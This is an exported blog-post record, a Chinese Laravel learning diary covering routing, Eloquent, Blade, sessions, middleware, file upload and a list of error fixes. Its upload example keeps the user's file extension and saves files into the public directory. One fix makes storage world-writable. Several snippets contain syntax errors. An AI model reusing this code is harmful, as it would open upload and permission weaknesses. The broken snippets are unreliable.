{\n\n            return redirect('activity0');\n        }\n\n        return $next($request);\n    }\n}\n```\n``` php\n// app\\Http\\Kernel.php 中添加一条Middleware\nprotected $routeMiddleware = [\n        'auth' => \\Illuminate\\Auth\\Middleware\\Authenticate::class,\n        'auth.basic' => \\Illuminate\\Auth\\Middleware\\AuthenticateWithBasicAuth::class,\n        'bindings' => \\Illuminate\\Routing\\Middleware\\SubstituteBindings::class,\n        'can' => \\Illuminate\\Auth\\Middleware\\Authorize::class,\n        'guest' => \\App\\Http\\Middleware\\RedirectIfAuthenticated::class,\n        'throttle' => \\Illuminate\\Routing\\Middleware\\ThrottleRequests::class,\n        'activity' => \\App\\Http\\Middleware\\Activity::class,\n    ];\n```\n**3.添加路由**\n``` php\nRoute::group(['middleware' => ['activity']], function () {\n    Route::any('activity1', 'StudentController@activity1');\n    Route::any('activity2', 'StudentController@activity2');\n});\n\nRoute::any('activity0', 'StudentController@activity0');\n```\n**4.浏览器访问activity1或者activity2**\n\n## File\n**项目中遇到一个问题，需要数据库储存图片，网上给出一个好的方式就是将图片的路径存进数据库，laravel中实现过程如下**\n**1.提交图片表单**\n``` php\n<form class=\"form-horizontal\" method=\"post\" enctype=\"multipart/form-data\" action=\"{{ url('test2') }}\">\n    {{ csrf_field() }}\n<input type=\"file\" name=\"photo\">\n<div class=\"form-group\">\n    <div class=\"col-sm-offset-2 col-sm-10\">\n        <button type=\"submit\" class=\"btn btn-primary\">提交</button>\n    </div>\n</div>\n</form>\n```\n**2.显示图片页面**\n``` php\n<img height=\"150\" width=\"150px\" src=\"{{url('/images/'.$image)}}\"/>\n```\n**3.控制器实现**\n``` php\npublic function test2(Request $request) {\n\n    $img = time() . '.' . $request->photo->getClientOriginalExtension();\n    $path = $request->photo->move(public_path('images'),$img);\n\n    return view('student.test2', [\n        'image' => $img,\n    ]);\n}\n```\n**最后图片存进了laravel项目下的public/images**\n\n## 踩坑总结\n1. `TokenMismatchException in VerifyCsrfToken.php line 68`\n**laravel 默认开启了 csrf验证 ，post请求需要验证csrf,所以要在表单里 加个隐藏域**\n**解决方案：**\n![](/images/laravel_problem_1.png)\n2. `MassAssignmentException in Model.php line 232:`\n**在添加学生的时候选择`action`为空时，会出现这个错误，解释为`new Student`时复制不能批量操作，因此要在`Model`中添加**\n``` php\nprotected $fillable = ['name', 'age', 'sex'];\n```\n3. `ErrorException in HasAttributes.php line 403:\nRelationship method must return an object of type Illuminate\\Database\\Eloquent\\Relations\\Relation`\n**在写`Student`模型的时候，将一个方法命名为`sex`，但`Student`又有一个属性是`sex`，两者相冲突了，因此需要将`sex`方法重新命名以解决冲突**\n4. `无法修改和删除数据`\n**这是我遇到的巨坑的一次，原因在于`Student Model`中将主码写错了，原本应该是`id`，被我写成了`ID`，然后一直被找出来，之前就有预感是`Student Model`错了，但是我检查了很多遍都没注意，吐血。。。**\n5. `PDOException in Connector.php line 55:could not find driver`\n**就像报错说的没有找到`driver(驱动)`，所以少了什么呢，少了`php`连接`mysql`的`module(组件)`，组件名字`pdo_mysql`，安装组件后重启`php-fpm`和`nginx`**\n``` bash\nyum install php70w-mysql\n```\n6. `Laravel sessions not working on server`\n**这个问题困扰我两天吧，然后先说遇到的问题，就是在浏览器中修改数据或者添加数据等操作后，应该在页面有一个提示消息，我单独分离出来用`Session`实现，在`php`内带服务器上可以正常工作，但是在我的`server`中却无法实现。解决方法是修改文件`model`**\n``` bash\nchmod -R a+rw storage/\n```\n7. `ErrorException in e4e354417ec7f106982a7198b9ad5688b9936b71.php line 1:\nUndefined variable: errors`\n**这个跟中间件有关系，主要实在5.2版本中会遇到，解决方案是将`Kernel.php`中的`$middlewareGroups`的内容移到`$middleware`中**\n8. `No supported encrypter found. The cipher and / or key length are invalid.`\n**执行`php artisan key:generate`就 ok**\n\n## 项目源码\n[laravel-ubuntu](https://github.com/fenlan/laravel-ubuntu)","source":"_posts/laravel.md","raw":"---\ntitle: laravel学习之旅\ntag: laravel\ndate: 2017-07-30 15:18:23\ncategories: php\n---\n\n## 路由\n**1.基本路由**\n``` php\nRoute::get('basic1', function () {\n    return 'Hello World';\n});\n```\n\n**2.路由参数**\n``` php\nRoute::get('user/{id}', function ($id) {\n    return 'User-id-' . $id;\n})->where('id', '[0-9]+');\n\nRoute::get('user/{name?}', function ($name = 'fenlan') {\n    return 'User-name-' . $name;\n})->where('name', '[A-Za-z]+');\n```\n<!--more-->\n**3.路由群组**\n``` php\nRoute::group(['prefix' => 'member'], function () {\n    Route::get('user/member-center', ['as' => 'center', function () {\n        return route('center');\n    }]);\n    Route::any('multy1', function () {\n        return 'member-multy1';\n    });\n});\n```\n\n**4.控制器关联**\n``` php\nRoute::get('member/{id}', 'MemberController@info');\n```\n> get参数中第一个是url路由，第二个是控制器MemberController及控制器中函数info\n\n## 控制器\n``` php\n<?php\n\nnamespace App\\Http\\Controllers;\n\nclass MemberController extends Controller\n{\n    public function info($id) {\n        //return 'member-info-id-' . $id;\n        //return view('welcome');\n        return view('info', [\n            'name' => 'fenlan',\n            'age' => 18,\n            'sex' => 'male'\n        ]);\n    }\n}\n```\n\n## 视图\n``` php\ninfo blade php\n{{$name}}\n{{$age}}\n{{$sex}}\n```\n**laravel新建视图完成后需要模块编译(我是这么理解的)**\n``` php\nphp artisan serve\n```\n\n## 连接数据库\n**在.env文件中修改配置**\n``` bash\nAPP_NAME=Laravel\nAPP_ENV=local\nAPP_KEY=\nAPP_DEBUG=true\nAPP_LOG_LEVEL=debug\nAPP_URL=http://localhost\n\nDB_CONNECTION=mysql\nDB_HOST=127.0.0.1\nDB_PORT=3306\nDB_DATABASE=homestead\nDB_USERNAME=homestead\nDB_PASSWORD=secret\n\nBROADCAST_DRIVER=log\nCACHE_DRIVER=file\nSESSION_DRIVER=file\nQUEUE_DRIVER=sync\n\nREDIS_HOST=127.0.0.1\nREDIS_PASSWORD=null\nREDIS_PORT=6379\n\nMAIL_DRIVER=smtp\nMAIL_HOST=smtp.mailtrap.io\nMAIL_PORT=2525\nMAIL_USERNAME=null\nMAIL_PASSWORD=null\nMAIL_ENCRYPTION=null\n\nPUSHER_APP_ID=\nPUSHER_APP_KEY=\nPUSHER_APP_SECRET=\n```\n**修改完成后再编译一下，就连接成功**\n\n## 数据库操作\n**1.使用DB facade实现CURD**\n``` php\n<?php\n\nnamespace App\\Http\\Controllers;\n\nuse Illuminate\\Support\\Facades\\DB;\n\nclass StudentController extends Controller\n{\n    public function test1() {\n        $student = DB::select('SELECT * FROM student');\n        dd($student);\n        // $bool = DB::insert('INSERT INTO student(name, ID) VALUES(?, ?)', ['fenlan', '15130110067']);\n        // $num = DB::update('UPDATE student SET in_time = ? WHERE ID = ?', ['2015', '15130110067']);\n        // $num = DB::delete('DELETE FROM student WHERE id > ?', ['15130110067']);\n    }\n}\n```\n**这种方法属于原始方法，接下来有更酷的操作数据库方法**\n\n**2.查询构造器及新增数据**\n``` php\npublic function test2() {\n        $bool = DB::table('student')->insert([\n            ['ID' => '15130110098', 'name' => '小淳', 'sex' => 'female', 'class' => '1513011',\n            'in_time' => '2015', 'status' => 'stay_in']\n            ['ID' => '15130110099', 'name' => '小明', 'sex' => 'female', 'class' => '1513011',\n            'in_time' => '2015', 'status' => 'stay_in']\n        ]);\n        var_dump($bool);\n\n        $num = DB::table('student')->where('id', '15130110067')->update('in_time' => '2016');\n        var_dump($num);\n        $num DB::table('student')->increment('class', 1);\n        var_dump($num);\n        $num = DB::table('student')->where('id', '>=', '15130110067')->delete();\n        var_dump($num);\n        DB::table('student')->truncate();   // delete all data in table\n\n        $students = DB::table('student')->get();     // return all data\n        dd($students);\n        $student = DB::table('student')->orderBy('id', 'desc')->first();\n        dd($student);\n        $names = DB::table('student')->pluck('name');    // return name attrubite\n        dd($names);\n        $names = DB::table('student')->lists('name', 'id');  // return id -> name(now this is removed)\n        dd($names);\n        $names = DB::table('student')->select('id', 'name', 'sex')->get();   // return attrubites\n        dd($names);\n        echo '<pre>';\n        DB::table('student')->chunk(2, function($students) {\n            var_dump($students);\n        });     // for big data query, query 2 data every time\n    }\n```\n**这个方法可以避免sql攻击注入，同时也人性化很多,还有很多内容，具体查看官方文档**\n[database](https://laravel.com/docs/5.4/queries)\n\n**3.Eloquent ORM**\n``` php\n<?php\n// app\\Student.php\nnamespace App;\n\nuse Illuminate\\Database\\Eloquent\\Model;\n\nclass Flight extends Model\n{\n    /**\n     * The table associated with the model.\n     *\n     * @var string\n     */\n    protected $table = 'student';\n    protected $primaryKey = 'id';\n}\n```\n``` php\n// app\\Http\\Controllers\\StudentController.php\n<?php\n\nnamespace App\\Http\\Controllers;\n\nuse App\\Student;\n\nclass StudentController extends Controller\n{\n    public function test() {\n        $students = Student::all();\n        $students = Student::find('15130110067')\n        dd($students);\n\n        $student = new Student();\n        $student->ID = '15130110070';\n        $student->name = '小青';\n        $student->sex = 'female';\n        $student->class = '1513011';\n        $student->in_time = '2015';\n        $student->status = 'stay_in';\n        $bool = $student->save();\n        dd($bool);\n    }\n}\n```\n``` php\n// ORM 正则搜索\npublic function search(Request $request) {\n\n    $keyword = $request->keyword;\n    $keyword = '%' . $keyword . '%';\n\n    // $books = DB::select('SELECT * FROM books WHERE keywords LIKE ?', [$keyword]);\n    $books = Book::where('keywords', 'LIKE', $keyword)->paginate(12);\n    if ($books->total()) {\n\n        return view('book.searchResults', [\n            'books' => $books,\n        ]);\n    } else {\n\n        return view('book.searchNoFound');\n    }\n}\n```\n**具体内容查看官方文档**\n[ORM](https://laravel.com/docs/5.4/eloquent)\n\n## blade模板\n``` php\n// views\\layout.blade.php\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <title>laravel模板继承</title>\n    <style>\n        .header {\n            width: 1000px;\n            height: 150px;\n            margin: 0 auto;\n            background: #f5f5f5;\n            border: 1px solid #ddd;\n        }\n\n        .main {\n            width: 1000px;\n            height: 300px;\n            margin: 0 auto;\n            margin-top: 15px;\n            clear: both;\n        }\n\n        .main .sidebar {\n            float: left;\n            width: 20%;\n            height: inherit;\n            background: #f5f5f5;\n            border: 1px solid #ddd;\n        }\n\n        .main .content {\n            float: right;\n            width: 75%;\n            height: inherit;\n            background: #f5f5f5;\n            border: 1px solid #ddd;\n        }\n\n        .footer {\n            width: 1000px;\n            height: 150px;\n            margin: 0 auto;\n            margin-top: 15px;\n            background: #f5f5f5;\n            border: 1px solid #ddd;\n        }\n    </style>\n</head>\n<body>\n    <div class='header'>\n        @section('header')\n        头部\n        @show\n    </div>\n\n    <div class='main'>\n        <div class='sidebar'>\n            @section('sidebar')\n            侧边栏\n            @show\n        </div>\n        <div class='content'>\n            @yield('content', '主要内容')\n        </div>\n    </div>\n\n    <div class=\"footer\">\n        @section('footer')\n        尾部\n        @show\n    </div>\n\n</body>\n</html>\n```\n``` php\n// views\\student\\test.php\n@extends('layout')\n\n@section('header')\n    @parent\n    header\n@stop\n\n@section('sidebar')\n    sidebar\n@stop\n\n@section('content')\n    content\n\n    <!-- 1.模板中输出变量 -->\n    <p>{{ $name }}</p>\n\n    <!-- 2.模板中调用PHP代码 -->\n    <p>{{ time() }}</p>\n    <p>{{ date('Y-m-d H:i:s', time()) }}</p>\n\n    <!-- 3.原样输出 -->\n    <p>@{{ $name }}</p>\n\n    {{-- 4.模板中注释 --}}\n\n    {{-- 5.引入子视图 --}}\n    @include('student.commen', ['message' => '我是错误信息'])\n\n    @if ($name == 'fenlan')\n        I'm fenlan\n    @elseif ($name == 'hello')\n        I'm hello\n    @else\n        Who am I?\n    @endif\n\n    <br>\n    @unless ($name != 'fenlan')\n        I'm fenlan\n    @endunless\n\n    <br>\n    @for ($i=0; $i < 10; $i++)\n        {{ $i }}\n    @endfor\n\n@stop\n```\n\n## Requests\n``` php\n<?php\n\nnamespace App\\Http\\Controllers;\n\nuse App\\Student;\nuse Illuminate\\Http\\Request;\n\nclass StudentController extends Controller\n{\n    public function test(Request $request) {\n        // 1.取值\n        echo $request->input('name', 'default');\n        echo $request->has('name');\n        $res = $request->all();\n        dd($res);\n\n        // 2.判断请求类型\n        echo $request->method();\n        echo $request->isMethod('GET');\n        $res = $request->is('student/*');\n        var_dump($res);\n    }\n}\n```\n\n## Session\n``` php\n// routes\\web.php\nRoute::group(['middleware' => ['web']], function () {\n   Route::any('session1', 'StudentController@session1');\n   Route::any('session2', 'StudentController@session2');\n});\n```\n``` php\n// 1.Http request session();\npublic function session1(Request $request) {\n        $request->session()->put('key1', 'value1');\n    }\n\n    public function session2(Request $request) {\n        echo $request->session()->get('key1');\n    }\n```\n``` php\n// 2.sesson()\npublic function session1(Request $request) {\n        session()->put('key2', 'value2');\n    }\n\n    public function session2(Request $request) {\n        echo session()->get('key2');\n    }\n```\n``` php\n// 3.Session class\n    public function session1(Request $request) {\n        Session::put('key3', 'value3');\n    }\n\n    public function session2(Request $request) {\n        echo session::get('key3', 'default');\n    }\n```\n``` php\npublic function session1(Request $request) {\n        Session::push('student', 'fenlan');\n        Session::push('student', 'shirk3');\n    }\n\n    public function session2(Request $request) {\n        $res = Session::get('student', 'default');\n        dd($res);\n    }\n```\n``` php\npublic function session1(Request $request) {\n        Session::forget('student');\n        Session::flush('key', 'default');\t// temporary\n        Session::flush();\n    }\n\n    public function session2(Request $request) {\n    \techo Session::has('student');\t\t// return bool\n        $res = Session::pull('student', 'default');\n        dd($res);\n    }\n```\n\n## Response\n``` php\npublic function test() {\n        // 响应json\n        $data = [\n          'errCode' => 0,\n          'errMsg' => 'success',\n          'data' => 'fenlan',\n        ];\n\n        return response()->json($data);\n}\n```\n``` php\npublic function test() {\n        // redirect\n        return redirect('session2');\n9}\n```\n\n## Middleware\n**目的：实现一个功能，当访问时间小于活动开始时间，则跳转到宣传页面，当访问时间大于活动开始时间，则跳转到活动界面**\n**1.宣传页面和活动页面构造**\n``` php\n// app\\Http\\Controller\\StudentController.php\n    // 宣传页面\n    public function activity0() {\n\n        return '活动快要开始啦，敬请关注';\n    }\n\n    // 活动页面\n    public function activity1() {\n\n        return '活动进行中，谢谢您的参与1';\n    }\n\n    // 活动页面\n    public function activity2() {\n\n        return '活动进行中，谢谢您的参与2';\n    }\n```\n**2.添加Middleware**\n``` php\n// app\\Http\\Middleware\\Activity.php\n<?php\n\nnamespace App\\Http\\Middleware;\n\nuse Closure;\n\nclass Activity\n{\n\n    public function handle($request, Closure $next) {\n\n        if (time() < strtotime('2017-08-03')) {\n\n            return redirect('activity0');\n        }\n\n        return $next($request);\n    }\n}\n```\n``` php\n// app\\Http\\Kernel.php 中添加一条Middleware\nprotected $routeMiddleware = [\n        'auth' => \\Illuminate\\Auth\\Middleware\\Authenticate::class,\n        'auth.basic' => \\Illuminate\\Auth\\Middleware\\AuthenticateWithBasicAuth::class,\n        'bindings' => \\Illuminate\\Routing\\Middleware\\SubstituteBindings::class,\n        'can' => \\Illuminate\\Auth\\Middleware\\Authorize::class,\n        'guest' => \\App\\Http\\Middleware\\RedirectIfAuthenticated::class,\n        'throttle' => \\Illuminate\\Routing\\Middleware\\ThrottleRequests::class,\n        'activity' => \\App\\Http\\Middleware\\Activity::class,\n    ];\n```\n**3.添加路由**\n``` php\nRoute::group(['middleware' => ['activity']], function () {\n    Route::any('activity1', 'StudentController@activity1');\n    Route::any('activity2', 'StudentController@activity2');\n});\n\nRoute::any('activity0', 'StudentController@activity0');\n```\n**4.浏览器访问activity1或者activity2**\n\n## File\n**项目中遇到一个问题，需要数据库储存图片，网上给出一个好的方式就是将图片的路径存进数据库，laravel中实现过程如下**\n**1.提交图片表单**\n``` php\n<form class=\"form-horizontal\" method=\"post\" enctype=\"multipart/form-data\" action=\"{{ url('test2') }}\">\n    {{ csrf_field() }}\n<input type=\"file\" name=\"photo\">\n<div class=\"form-group\">\n    <div class=\"col-sm-offset-2 col-sm-10\">\n        <button type=\"submit\" class=\"btn btn-primary\">提交</button>\n    </div>\n</div>\n</form>\n```\n**2.显示图片页面**\n``` php\n<img height=\"150\" width=\"150px\" src=\"{{url('/images/'.$image)}}\"/>\n```\n**3.控制器实现**\n``` php\npublic function test2(Request $request) {\n\n    $img = time() . '.' . $request->photo->getClientOriginalExtension();\n    $path = $request->photo->move(public_path('images'),$img);\n\n    return view('student.test2', [\n        'image' => $img,\n    ]);\n}\n```\n**最后图片存进了laravel项目下的public/images**\n\n## 踩坑总结\n1. `TokenMismatchException in VerifyCsrfToken.php line 68`\n**laravel 默认开启了 csrf验证 ，post请求需要验证csrf,所以要在表单里 加个隐藏域**\n**解决方案：**\n![](/images/laravel_problem_1.png)\n2. `MassAssignmentException in Model.php line 232:`\n**在添加学生的时候选择`action`为空时，会出现这个错误，解释为`new Student`时复制不能批量操作，因此要在`Model`中添加**\n``` php\nprotected $fillable = ['name', 'age', 'sex'];\n```\n3. `ErrorException in HasAttributes.php line 403:\nRelationship method must return an object of type Illuminate\\Database\\Eloquent\\Relations\\Relation`\n**在写`Student`模型的时候，将一个方法命名为`sex`，但`Student`又有一个属性是`sex`，两者相冲突了，因此需要将`sex`方法重新命名以解决冲突**\n4. `无法修改和删除数据`\n**这是我遇到的巨坑的一次，原因在于`Student Model`中将主码写错了，原本应该是`id`，被我写成了`ID`，然后一直被找出来，之前就有预感是`Student Model`错了，但是我检查了很多遍都没注意，吐血。。。**\n5. `PDOException in Connector.php line 55:could not find driver`\n**就像报错说的没有找到`driver(驱动)`，所以少了什么呢，少了`php`连接`mysql`的`module(组件)`，组件名字`pdo_mysql`，安装组件后重启`php-fpm`和`nginx`**\n``` bash\nyum install php70w-mysql\n```\n6. `Laravel sessions not working on server`\n**这个问题困扰我两天吧，然后先说遇到的问题，就是在浏览器中修改数据或者添加数据等操作后，应该在页面有一个提示消息，我单独分离出来用`Session`实现，在`php`内带服务器上可以正常工作，但是在我的`server`中却无法实现。解决方法是修改文件`model`**\n``` bash\nchmod -R a+rw storage/\n```\n7. `ErrorException in e4e354417ec7f106982a7198b9ad5688b9936b71.php line 1:\nUndefined variable: errors`\n**这个跟中间件有关系，主要实在5.2版本中会遇到，解决方案是将`Kernel.php`中的`$middlewareGroups`的内容移到`$middleware`中**\n8. `No supported encrypter found. The cipher and / or key length are invalid.`\n**执行`php artisan key:generate`就 ok**\n\n## 项目源码\n[laravel-ubuntu](https://github.com/fenlan/laravel-ubuntu)","slug":"laravel","published":1,"updated":"2017-11-28T02:51:23.059Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjsczh002hyp0lkjxfqo1c","content":"<h2 id=\"路由\"><a href=\"#路由\" class=\"headerlink\" title=\"路由\"></a>路由</h2><p><strong>1.基本路由</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Route::get(<span class=\"string\">'basic1'</span>, <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'Hello World'</span>;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\n<p><strong>2.路由参数</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Route::get(<span class=\"string\">'user/&#123;id&#125;'</span>, <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">($id)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'User-id-'</span> . $id;</span><br><span class=\"line\">&#125;)-&gt;where(<span class=\"string\">'id'</span>, <span class=\"string\">'[0-9]+'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Route::get(<span class=\"string\">'user/&#123;name?&#125;'</span>, <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">($name = <span class=\"string\">'fenlan'</span>)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'User-name-'</span> . $name;</span><br><span class=\"line\">&#125;)-&gt;where(<span class=\"string\">'name'</span>, <span class=\"string\">'[A-Za-z]+'</span>);</span><br></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<p><strong>3.路由群组</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Route::group([<span class=\"string\">'prefix'</span> =&gt; <span class=\"string\">'member'</span>], <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    Route::get(<span class=\"string\">'user/member-center'</span>, [<span class=\"string\">'as'</span> =&gt; <span class=\"string\">'center'</span>, <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> route(<span class=\"string\">'center'</span>);</span><br><span class=\"line\">    &#125;]);</span><br><span class=\"line\">    Route::any(<span class=\"string\">'multy1'</span>, <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'member-multy1'</span>;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\n<p><strong>4.控制器关联</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Route::get(<span class=\"string\">'member/&#123;id&#125;'</span>, <span class=\"string\">'MemberController@info'</span>);</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>get参数中第一个是url路由，第二个是控制器MemberController及控制器中函数info</p>\n</blockquote>\n<h2 id=\"控制器\"><a href=\"#控制器\" class=\"headerlink\" title=\"控制器\"></a>控制器</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">App</span>\\<span class=\"title\">Http</span>\\<span class=\"title\">Controllers</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MemberController</span> <span class=\"keyword\">extends</span> <span class=\"title\">Controller</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">info</span><span class=\"params\">($id)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//return 'member-info-id-' . $id;</span></span><br><span class=\"line\">        <span class=\"comment\">//return view('welcome');</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> view(<span class=\"string\">'info'</span>, [</span><br><span class=\"line\">            <span class=\"string\">'name'</span> =&gt; <span class=\"string\">'fenlan'</span>,</span><br><span class=\"line\">            <span class=\"string\">'age'</span> =&gt; <span class=\"number\">18</span>,</span><br><span class=\"line\">            <span class=\"string\">'sex'</span> =&gt; <span class=\"string\">'male'</span></span><br><span class=\"line\">        ]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"视图\"><a href=\"#视图\" class=\"headerlink\" title=\"视图\"></a>视图</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">info blade php</span><br><span class=\"line\">&#123;&#123;$name&#125;&#125;</span><br><span class=\"line\">&#123;&#123;$age&#125;&#125;</span><br><span class=\"line\">&#123;&#123;$sex&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>laravel新建视图完成后需要模块编译(我是这么理解的)</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php artisan serve</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"连接数据库\"><a href=\"#连接数据库\" class=\"headerlink\" title=\"连接数据库\"></a>连接数据库</h2><p><strong>在.env文件中修改配置</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">APP_NAME=Laravel</span><br><span class=\"line\">APP_ENV=<span class=\"built_in\">local</span></span><br><span class=\"line\">APP_KEY=</span><br><span class=\"line\">APP_DEBUG=<span class=\"literal\">true</span></span><br><span class=\"line\">APP_LOG_LEVEL=debug</span><br><span class=\"line\">APP_URL=http://localhost</span><br><span class=\"line\"></span><br><span class=\"line\">DB_CONNECTION=mysql</span><br><span class=\"line\">DB_HOST=127.0.0.1</span><br><span class=\"line\">DB_PORT=3306</span><br><span class=\"line\">DB_DATABASE=homestead</span><br><span class=\"line\">DB_USERNAME=homestead</span><br><span class=\"line\">DB_PASSWORD=secret</span><br><span class=\"line\"></span><br><span class=\"line\">BROADCAST_DRIVER=<span class=\"built_in\">log</span></span><br><span class=\"line\">CACHE_DRIVER=file</span><br><span class=\"line\">SESSION_DRIVER=file</span><br><span class=\"line\">QUEUE_DRIVER=sync</span><br><span class=\"line\"></span><br><span class=\"line\">REDIS_HOST=127.0.0.1</span><br><span class=\"line\">REDIS_PASSWORD=null</span><br><span class=\"line\">REDIS_PORT=6379</span><br><span class=\"line\"></span><br><span class=\"line\">MAIL_DRIVER=smtp</span><br><span class=\"line\">MAIL_HOST=smtp.mailtrap.io</span><br><span class=\"line\">MAIL_PORT=2525</span><br><span class=\"line\">MAIL_USERNAME=null</span><br><span class=\"line\">MAIL_PASSWORD=null</span><br><span class=\"line\">MAIL_ENCRYPTION=null</span><br><span class=\"line\"></span><br><span class=\"line\">PUSHER_APP_ID=</span><br><span class=\"line\">PUSHER_APP_KEY=</span><br><span class=\"line\">PUSHER_APP_SECRET=</span><br></pre></td></tr></table></figure></p>\n<p><strong>修改完成后再编译一下，就连接成功</strong></p>\n<h2 id=\"数据库操作\"><a href=\"#数据库操作\" class=\"headerlink\" title=\"数据库操作\"></a>数据库操作</h2><p><strong>1.使用DB facade实现CURD</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">App</span>\\<span class=\"title\">Http</span>\\<span class=\"title\">Controllers</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Illuminate</span>\\<span class=\"title\">Support</span>\\<span class=\"title\">Facades</span>\\<span class=\"title\">DB</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">StudentController</span> <span class=\"keyword\">extends</span> <span class=\"title\">Controller</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test1</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        $student = DB::select(<span class=\"string\">'SELECT * FROM student'</span>);</span><br><span class=\"line\">        dd($student);</span><br><span class=\"line\">        <span class=\"comment\">// $bool = DB::insert('INSERT INTO student(name, ID) VALUES(?, ?)', ['fenlan', '15130110067']);</span></span><br><span class=\"line\">        <span class=\"comment\">// $num = DB::update('UPDATE student SET in_time = ? WHERE ID = ?', ['2015', 